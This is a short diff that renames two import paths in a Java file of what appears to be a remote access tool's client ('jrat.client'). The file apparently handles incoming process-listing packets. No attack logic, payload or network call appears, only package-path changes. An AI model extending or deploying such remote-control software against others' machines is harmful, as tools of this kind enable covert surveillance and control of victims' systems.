@@ -1,7 +1,7 @@
 package jrat.client.packets.incoming;
 
-import io.jrat.common.ProcessData;
-import io.jrat.common.utils.DataUnits;
+import jrat.common.ProcessData;
+import jrat.common.utils.DataUnits;
 import jrat.client.Connection;
 import jrat.client.packets.outgoing.Packet25Process;
 import java.awt.image.BufferedImage;
